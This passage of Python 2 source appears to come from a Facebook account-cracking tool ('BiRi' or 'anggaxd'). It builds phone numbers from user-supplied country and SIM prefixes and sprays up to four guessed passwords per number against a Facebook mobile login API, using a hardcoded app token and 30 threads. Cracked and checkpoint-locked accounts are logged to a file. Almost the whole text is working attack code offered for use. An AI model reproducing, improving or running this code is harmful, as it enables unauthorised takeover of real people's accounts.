        print '\x1b[1;96m\xf0\x9f\x92\x9bUSA\xf0\x9f\x92\x9b SIM code :( 786,815,315,256,401,718,)'
        print '\x1b[1;93m\xf0\x9f\x92\x98INDONESIA\xf0\x9f\x92\x98SIM code :( 786,815,315,256,401,)'
        print '\x1b[1;95m\xf0\x9f\x92\x8cUK\xf0\x9f\x92\x8cSIM code:( 737,706,748,783,739,759,790,)'
        print '\x1b[1;91m-------------------------------------------'
        
        try:
            c = raw_input('\x1b[1;96mENTER ANY Country CODE NUMBER: ')
            k = raw_input('\x1b[1;95mENTER ANY SIM CODE HERE  : ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
        

    if anggaxd == '2' or anggaxd == '02':
        os.system('clear')
        print logoxd
        psb('\x1b[1;93mSedang Update Tools ....')
        time.sleep(2)
        os.system('pip2 install --upgrade anggaxd')
        os.system('pip2 install request && pip2 install mechanize')
        os.system('git pull origin master')
        os.system('anggaxd')
        os.system('clear')
        psb('\n\n\n\x1b[1;93mTOOLS SUDAH DI UPDATE')
        time.sleep(1)
        menu()
    elif anggaxd == '0' or anggaxd == '00':
        keluar()
    else:
        print '[!] Fill In Correctly'
        avs()
    print '\x1b[1;91m--------------------------------------------------'
    print '\x1b[1;92m   \xf0\x9f\x92\x9e7 digit automatic BiRi clone\xf0\x9f\x92\x9e'
    print '\x1b[1;95m  Example Password \x1b[1;93m : \x1b[1;91m786786,123456,000786'
    anggaxdpw1 = raw_input('\x1b[1;92m+ \x1b[1;93mENTER YOUR FAVOURITE Password 1 : ')
    anggaxdpw2 = raw_input('\x1b[1;93m+ \x1b[1;91mENTER YOUR FAVOURITE Password 2 : ')
    anggaxdpw3 = raw_input('\x1b[1;96m+ \x1b[1;96mENTER YOUR FAVOURITE Password 3 : ')
    print '\x1b[1;91m--------------------------------------------------'
    xxx = str(len(id))
    psb('\x1b[1;97m[\x1b[1;92m+\x1b[1;97m] Total Numbers : ' + xxx)
    time.sleep(0.5)
    psb('[\x1b[1;92m\xe2\x9c\x93\x1b[1;95m] Cracking Process Has Been Started ...')
    time.sleep(0.5)
    psb('[\x1b[1;91m!\x1b[1;93m] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    print '\x1b[1;91m--------------------------------------------------'
    
    def main(arg):
        user = arg
        
        try:
            os.mkdir('biri')
        except OSError:
            pass

        
        try:
            pass1 = anggaxdpw1
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[Successful]' + c + k + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mBiRi-Successful\x1b[1;92m] ' + c + k + user + ' \xe2\x97\x90 ' + pass1
                okb = open('biri/crack.txt', 'a')
                okb.write('[BiRi-Successful] ' + c + k + user + ' \xe2\x97\x90 ' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93m[BiRi-Lock]\x1b[1;93m] ' + c + k + user + ' \xe2\x97\x90 ' + pass1
                cps = open('biri/crack.txt', 'a')
                cps.write('[BiRi-Lock] ' + c + k + user + ' \xf0\x9f\x92\x8f ' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = anggaxdpw2
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[Successful]' + c + k + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92BiRi-Successful\x1b[1;97m] ' + c + k + user + ' \xe2\x97\x90 ' + pass2
                    okb = open('biri/crack.txt', 'a')
                    okb.write('[BiRi-Successful] ' + c + k + user + ' \xe2\x97\x90 ' + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;91m[BiRi-Lock]\x1b[1;91m] ' + c + k + user + ' \xe2\x97\x90 ' + pass2
                    cps = open('biri/crack.txt', 'a')
                    cps.write('[BiRi-Lock] ' + c + k + user + ' \xf0\x9f\x92\x9e ' + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = anggaxdpw3
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[Successful]' + c + k + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mBiRi-Successful\x1b[1;91m] ' + c + k + user + ' \xe2\x97\x90 ' + pass3
                        okb = open('biri/crack.txt', 'a')
                        okb.write('[BiRi-Successful] ' + c + k + user + ' \xe2\x97\x90 ' + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;96m[BiRi-Lock]\x1b[1;96m] ' + c + k + user + ' \xe2\x97\x90 ' + pass3
                        cps = open('biri/crack.txt', 'a')
                        cps.write('[BiRi-Lock] ' + c + k + user + ' \xf0\x9f\x92\x97 ' + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = user
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[Successful]' + c + k + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;92mBiRi-Successful\x1b[1;97m] ' + c + k + user + ' \xe2\x97\x90 ' + pass4
                            okb = open('biri/crack.txt', 'a')
                            okb.write('[BiRi-Successful] ' + c + k + user + ' \xe2\x97\x90 ' + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;92m[\x1b[1;92m[BiRi-Lock]\x1b[1;92m] ' + c + k + user + ' \xe2\x97\x90 ' + pass4
                            cps = open('biri/crack.txt', 'a')
                            cps.write('[BiRi-Lock] ' + c + k + user + ' \xf0\x9f\x9a\xac ' + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;91m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Process Has Been Completed ...'
    print '[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Total \x1b[1;92mSuccessfuly\x1b[1;97m/\x1b[1;93mCheckpoint\x1b[1;97m : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] Cracking Accounts Has Been Saved : biri/crack.txt'
    raw_input('\n\x1b[1;97m[\x1b[1;97mPress Enter Go Back\x1b[1;97m]')
    menu()

if __name__ == '__main__':
    u()
